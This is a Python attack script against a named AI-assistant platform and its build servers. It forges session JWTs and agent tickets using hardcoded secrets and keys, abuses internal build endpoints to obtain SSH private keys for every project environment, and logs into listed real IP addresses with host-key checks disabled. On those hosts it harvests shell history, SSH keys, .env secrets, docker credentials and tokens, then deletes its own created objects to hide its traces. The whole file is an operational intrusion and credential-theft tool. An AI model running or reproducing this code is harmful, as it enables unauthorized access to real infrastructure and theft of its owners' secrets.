# -*- coding: utf-8 -*-
# intent 29299 round B: enumerate ALL proj_UWYqo environments' SSH credentials via chat-claim ticket, ssh each, deep harvest build machine aro-81 etc.
import json,os,sys,base64,re,subprocess,time
HOST="assistant.lumiiai.cn"; BASE="https://"+HOST
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
AJWT="ce9a4dedd895086314a624d5039fc9ecdf06713424348cf72fa7815817d3a938"
ORG="org_bTLzxtBLmugV8uxx4QTyw"; USER="usr_ZxLewKrgbRYSm7rWDtQX8"
PROJ="proj_UWYqoFajbyb8wZchMjPZm"
DER_B64="MC4CAQAwBQYDK2VwBCIEIDBpyNy4vf5x/6pHS60sCrMBk/pcTOjxbKFwMtaXL3UG"
WORK="/tmp/p29299b"; os.makedirs(WORK,exist_ok=True)

def R(k,v):
    try: s=json.dumps(v,ensure_ascii=False)
    except Exception: s=repr(v)
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()

def curl(args,timeout=40,stdin=None):
    try:
        p=subprocess.run(["curl","--http2","-sS"]+args,input=stdin,capture_output=True,timeout=timeout+15)
        return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()

def call(path,method="GET",body=None,hdrs=None,timeout=40,maxlen=20000,cookie=None):
    args=["-m",str(timeout),"-A",UA,"-w","\n__CODE__%{http_code}"]
    if cookie: args+=["-H","Cookie: "+cookie]
    h={"Accept":"application/json","Referer":BASE+"/","Origin":BASE}
    if hdrs: h.update(hdrs)
    for k,v in h.items(): args+=["-H","%s: %s"%(k,v)]
    data=None
    if body is not None:
        data=json.dumps(body).encode(); args+=["-H","Content-Type: application/json","--data-binary","@-"]
    if method!="GET": args+=["-X",method]
    args+=[BASE+path]
    rc,out,err=curl(args,timeout=timeout,stdin=data)
    txt=out.decode("utf-8","replace"); code=""; i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
    return {"code":code,"body":txt[:maxlen],"len":len(txt),"err":err.decode("utf-8","replace")[:150]}
def J(r):
    try: return json.loads(r["body"])
    except Exception: return None

def _b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge_a(secret,sub,org):
    import hmac,hashlib
    now=int(time.time())
    h=_b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    p=_b64u(json.dumps({"sub":sub,"org":org,"iat":now,"exp":now+2592000,"sid":"sid_%d"%now,"lgn":now},separators=(",",":")))
    sig=_b64u(hmac.new(secret.encode(),(h+"."+p).encode(),hashlib.sha256).digest())
    return "lumii_session="+h+"."+p+"."+sig

der=base64.b64decode(DER_B64); open(WORK+"/k.der","wb").write(der)
open(WORK+"/sign.js","w").write(r'''
const fs=require('fs'),crypto=require('crypto');
const der=fs.readFileSync(process.argv[2]); const msg=fs.readFileSync(process.argv[3]);
const k=crypto.createPrivateKey({key:der,format:'der',type:'pkcs8'});
process.stdout.write(crypto.sign(null,msg,k).toString('base64url'));
''')
def ed_sign(payload):
    open(WORK+"/msg.txt","wb").write(payload.encode())
    p=subprocess.run(["node",WORK+"/sign.js",WORK+"/k.der",WORK+"/msg.txt"],capture_output=True,timeout=25)
    return p.stdout.decode().strip()
def mint_ticket(agent_id, chat):
    now=int(time.time())
    claims={"kid":"46b1701a","iss":"center","aud":agent_id,"org":ORG,"iat":now,"exp":now+7200,
            "session_key":"dashboard:"+chat["conversation_id"],"turn_id":"","platform":"dashboard",
            "chat_id":chat["conversation_id"],"actor_id":USER,"on_behalf_of":USER,
            "assistant_id":chat["assistant_id"],"team_id":None,"chain":[],"chat":chat}
    payload=_b64u(json.dumps(claims,separators=(",",":"),ensure_ascii=False))
    return "v2."+payload+"."+ed_sign(payload), claims

C=forge_a(AJWT,USER,ORG)
me=call("/api/me",cookie=C,maxlen=300); R("me",{"code":me["code"]})
rt=call("/api/runtimes","POST",{"name":"pr29299b","visibility":"org"},cookie=C,maxlen=400000)
RJ=J(rt) or {}; RTID=RJ.get("id") or ""; RID=RJ.get("agentId") or ""; script=RJ.get("script","") or ""
mm=re.search(r"AGENT_TOKEN='([^']+)'",script) or re.search(r"AGENT_TOKEN=\"?([A-Za-z0-9_\-]{20,})",script)
RTOK=mm.group(1) if mm else ""
R("rt",{"code":rt["code"],"rtid":RTID,"agent":RID,"toklen":len(RTOK)})
MH={"Authorization":"Bearer "+RTOK,"x-agent-id":RID}

# new assistant + conversation in proj_UWYqo
asst=""; conv=""
ac=call("/api/assistants","POST",{"name":"pr29299b","runtimeId":RTID},cookie=C,maxlen=3000)
AJ=J(ac) or {}; asst=AJ.get("id") or (AJ.get("assistant") or {}).get("id") or ""
R("asst",{"code":ac["code"],"id":asst,"body":ac["body"][:300]})
if asst:
    cvc=call("/api/conversations","POST",{"projectId":PROJ,"assistantId":asst,"title":"pr29299b"},cookie=C,maxlen=3000)
    CJ=J(cvc) or {}; conv=CJ.get("id") or (CJ.get("conversation") or {}).get("id") or ""
    R("conv",{"code":cvc["code"],"id":conv,"body":cvc["body"][:300]})

runs=[]
if RID and RTOK and conv and asst:
    chat={"project_id":PROJ,"conversation_id":conv,"assistant_id":asst,"repo_ids":[]}
    tick,claims=mint_ticket(RID,chat); R("ticket",{"len":len(tick),"claims":claims})
    MH["x-lumii-turn-proof"]=tick
    # full ops parse
    opz=J(call("/api/projects/%s/ops"%PROJ,cookie=C,maxlen=300000)) or {}
    envs=opz.get("environments") or []
    R("envs",[{"id":e.get("id"),"key":e.get("key"),"name":e.get("name"),"tier":e.get("tier"),"host":(e.get("sshKey") or {}).get("host"),"port":(e.get("sshKey") or {}).get("port"),"user":(e.get("sshKey") or {}).get("loginUser"),"root":(e.get("sshKey") or {}).get("remoteRoot")} for e in envs])
    credmap={}
    for e in envs:
        eid=e.get("id"); key=(e.get("sshKey") or {}).get("name")
        cr=call("/internal/build/credential","POST",{"environment_id":eid,"purpose":"ssh_agent"},hdrs=MH,maxlen=20000)
        cj=J(cr) or {}
        rec={"env":e.get("key"),"eid":eid,"code":cr["code"],"host":cj.get("host"),"port":cj.get("port"),"user":cj.get("login_user"),"root":cj.get("remote_root"),"has_key":bool(cj.get("private_key"))}
        if cj.get("message"): rec["msg"]=cj["message"][:160]
        if cj.get("private_key"):
            fn="%s_%s"%(e.get("key") or eid, cj.get("host"))
            open(WORK+"/k_"+fn,"w").write(cj["private_key"]); os.chmod(WORK+"/k_"+fn,0o600)
            rec["keyfile"]="k_"+fn
            credmap[(cj.get("host"),int(cj.get("port") or 22),cj.get("login_user") or "ubuntu",cj.get("remote_root") or "")]=fn
        runs.append(rec)
    R("env_creds",runs)
    # project ssh keys too
    sk=call("/internal/build/ssh-keys",method="POST",body={},hdrs=MH,maxlen=20000)
    SKJ=J(sk) or {}
    for k in (SKJ.get("ssh_keys") or []):
        kid=k.get("key_id")
        cr=call("/internal/build/credential","POST",{"ssh_key_id":kid,"purpose":"ssh_agent"},hdrs=MH,maxlen=20000)
        cj=J(cr) or {}
        if cj.get("private_keys"):
            open(WORK+"/pk_"+kid,"w").write(cj["private_keys"][0]); os.chmod(WORK+"/pk_"+kid,0o600)
            for h in (k.get("hosts") or []):
                if h.get("host"): credmap[(h.get("host"),int(h.get("port") or 22),h.get("login_user") or "ubuntu","")]="pk_"+kid
    # extra build ports
    extras=[("43.142.238.91",2222,"user1"),("43.142.238.91",2223,"ubuntu"),("129.211.0.26",2246,"ubuntu")]
    R("credmap",[{"host":a,"port":b,"user":c,"key":d} for (a,b,c,d) in credmap.keys()|set()] if False else [{"host":h,"port":p,"user":u,"key":f} for (h,p,u,r),f in credmap.items()])
    # dedupe target list, priority first
    pri=[("81.68.254.22",22,"ubuntu"),("43.142.238.91",22,"ubuntu"),("122.51.1.87",22,"ubuntu"),
         ("13.215.141.192",22,"ubuntu"),("101.32.60.77",22,"ubuntu")]+extras
    seen=set(); tl=[]
    for (h,p,u,r),f in credmap.items():
        if (h,p,u) not in seen: seen.add((h,p,u)); tl.append((h,p,u,f))
    envkey=None
    for kk,v in credmap.items():
        if v.startswith('k_'): envkey=v; break
    for h,p,u in pri:
        if (h,p,u) in seen: continue
        f=envkey
        if f: seen.add((h,p,u)); tl.append((h,p,u,f))
    R("targets",[{"host":h,"port":p,"user":u,"key":f} for h,p,u,f in tl])
    HARV2=("id; hostname; echo ---HIST; tail -40 ~/.bash_history 2>/dev/null; echo ---SSH; ls -la ~/.ssh 2>/dev/null; "
           "echo ---IDED; cat ~/.ssh/id_ed25519 2>/dev/null; echo ---KNOWN; head -15 ~/.ssh/known_hosts 2>/dev/null; "
           "echo ---OPT; ls -la /opt /opt/src 2>/dev/null; echo ---DEPLOY; ls -la ~/lumii-deploy ~/deploy 2>/dev/null; "
           "echo ---ENVF; (set -a; . /opt/lumii-prod/.env.dev 2>/dev/null; . /opt/lumii-stage/.env.dev 2>/dev/null; env | grep -Ei 'SECRET|TOKEN|PASS|KEY|DSN|DATABASE|ZOOFI|LUMII|AWS|ALIYUN|TENCENT|DOCKER|REGISTRY|GH_|GIT' | head -70); "
           "echo ---SUDO; sudo -n true 2>&1 && echo SUDO_OK")
    HARV3=("echo ---ENVDEV; cat /opt/lumii-prod/.env.dev /opt/lumii-stage/.env.dev 2>/dev/null | head -c 11000; "
           "echo ---SRC; ls -la /opt/src 2>/dev/null | head -30; echo ---SRCL; ls -la /opt/src/* 2>/dev/null | head -60; "
           "echo ---CIF; find /opt/src /home/ubuntu -maxdepth 3 \\( -name '.env*' -o -name '.git-credentials' -o -name 'config.json' -o -name '*.pem' -o -name '*.key' \\) 2>/dev/null | head -25; "
           "echo ---DOCKER; cat ~/.docker/config.json /etc/docker/daemon.json 2>/dev/null | head -c 1500; "
           "echo ---ZOOFI; timeout 25 grep -rIl -m1 -E 'zoofi-index|0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|cloudflared|rathole' /opt /home/ubuntu /etc 2>/dev/null | head -12")
    summary=[]
    for (h,p,u,f) in tl[:16]:
        kf=os.path.join(WORK,f)
        if not os.path.exists(kf): continue
        try:
            p1=subprocess.run(["ssh","-i",kf,"-p",str(p),"-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=8","-o","IdentitiesOnly=yes","%s@%s"%(u,h),HARV2],capture_output=True,timeout=35)
            out=p1.stdout.decode("utf-8","replace"); err=p1.stderr.decode("utf-8","replace"); rc=p1.returncode
        except Exception as e:
            out="";err=repr(e);rc=-1
        R("s2_%s_%s_%s_%s"%(h,u,p,f.replace('/','_')),{"rc":rc,"out":out[:6500],"err":err[-300:]})
        summary.append({"host":h,"port":p,"user":u,"key":f,"rc":rc,"ok":bool(out.strip()),"err_tail":err[-120:]})
        if rc==0 and out.strip():
            try:
                p2=subprocess.run(["ssh","-i",kf,"-p",str(p),"-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=8","-o","IdentitiesOnly=yes","%s@%s"%(u,h),HARV3],capture_output=True,timeout=40)
                R("s3_%s_%s"%(h,u),p2.stdout.decode("utf-8","replace")[:15000])
            except Exception as e:
                R("s3_err_%s"%h,repr(e)[:150])
    R("ssh_summary2",summary)
else:
    R("fatal",{"rid":RID,"tok":bool(RTOK),"conv":conv,"asst":asst})

def dele(path):
    r=call(path,method="DELETE",cookie=C,maxlen=400); return {"path":path,"code":r["code"],"body":r["body"][:150]}
cl=[]
for p in ["/api/runtimes/"+RTID if RTID else "", "/api/assistants/"+asst if asst else "", "/api/conversations/"+conv if conv else ""]:
    if p: cl.append(dele(p))
R("cleanup",cl)
R("done",{"t":int(time.time())})
